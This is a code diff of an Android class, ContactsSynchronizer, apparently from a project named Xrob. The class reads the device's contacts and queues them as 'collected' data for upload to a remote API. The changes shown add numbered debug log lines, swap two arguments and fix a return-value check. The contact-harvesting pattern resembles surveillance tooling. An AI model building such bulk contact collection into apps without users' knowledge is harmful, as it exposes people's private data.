@@ -39,21 +39,26 @@ public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {
 
     public ContactsSynchronizer(Context context, String apiKey) {
         super(context, apiKey);
-        Log.d(X, "Started ContactsSynchronizer");
+        Log.d(X, "Starting contact sync... 3");
     }
 
 
     @Override
     protected Void doInBackground(String... string) {
 
+        Log.d(X, "Starting contact sync... 4");
+
         final boolean isSyncNeeded = refreshContacts(getContext());
 
         if (isSyncNeeded) {
+
+            Log.d(X, "Starting contact sync... 6");
 
             new APIRequestGateway(getContext(), new APIRequestGateway.APIRequestGatewayCallback() {
 
                 @Override
                 public void onReadyToRequest(String apiKey) {
+                    Log.d(X, "Starting contact sync... 8");
                     push(getContext(), getApiKey());
                 }
 
@@ -63,6 +68,8 @@ public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {
                 }
 
             });
+        } else {
+            Log.d(X, "Starting contact sync... 7");
         }
 
 
@@ -76,6 +83,8 @@ public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {
      * @return boolean true if sync needed
      */
     private static synchronized boolean refreshContacts(Context context) {
+
+        Log.d(X, "Starting contact sync... 5");
 
         Log.i(X, "--------------------------------------");
         Log.i(X, "Refreshing contacts....");
@@ -194,6 +203,7 @@ public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {
     }
 
     private static synchronized void push(final Context context, final String apiKey) {
+        Log.d(X, "Starting contact sync... 9");
         final Contacts contactsTable = Contacts.getInstance(context);
         final List<Contact> unSyncedContacts = contactsTable.getNonSyncedContacts();
 
@@ -236,14 +246,13 @@ public class ContactsSynchronizer extends BaseJSONPostNetworkAsyncTask<Void> {
                 final String message = String.format(Locale.getDefault(), "%d contact(s) retrieved", jaContacts.length());
                 final String data = jaContacts.toString();
 
-
                 final boolean isAdded = PendingDeliveries.getInstance(context).add(new PendingDelivery(
                         null,
                         false,
                         Xrob.DATA_TYPE_CONTACTS,
-                        message,
-                        data
-                )) != 1;
+                        data,
+                        message
+                )) != -1;
 
                 if (isAdded) {
                     //Synced data collected
